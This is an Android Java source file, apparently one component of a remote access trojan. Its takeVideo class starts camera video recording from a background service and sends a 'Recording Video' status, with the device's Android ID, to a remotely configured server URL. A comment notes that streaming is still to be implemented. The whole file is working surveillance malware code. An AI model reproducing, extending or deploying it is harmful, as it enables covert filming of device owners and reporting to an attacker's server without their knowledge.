package u.can.i.up.expert.utils;

import android.content.Intent;
import android.hardware.Camera;
import android.os.AsyncTask;
import android.preference.PreferenceManager;

import java.io.UnsupportedEncodingException;

import u.can.i.up.expert.common.DataSet;
import u.can.i.up.expert.common.Factory;
import u.can.i.up.expert.framework.VideoView;

/**
 * Created by lczgywzyy on 2015/1/13.
 */
public class takeVideo extends AsyncTask<String, Void, String> {
    String i = "0";
    String j = "10000";
    public takeVideo(String i, String j) {
        this.i = i;
        this.j = j;
    }
    @Override
    protected String doInBackground(String... params) {
        int numCameras = Camera.getNumberOfCameras();
        if (numCameras > Integer.parseInt(i)) {
            Intent intent = new Intent(DataSet.getInstance().myService.getApplicationContext(), VideoView.class);
            intent.putExtra("Camera", i);
            intent.putExtra("Time", j);

            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            DataSet.getInstance().myService.startActivity(intent);
        }
        //NEED TO IMPLEMENT STREAMING
        return "Executed";
    }
    @Override
    protected void onPostExecute(String result) {
        try {
            Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "Recording Video");
        } catch (UnsupportedEncodingException e1) {
            e1.printStackTrace();
        }
        try {
            Thread.sleep(Integer.parseInt(j));
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
//        	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Media",false).commit();
    }
    @Override
    protected void onPreExecute() {
        while(PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getBoolean("Media",false) == true)
        {
            try {
                Thread.sleep(5000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }

        PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).edit().putBoolean("Media",true).commit();
    }
    @Override
    protected void onProgressUpdate(Void... values) {}
}
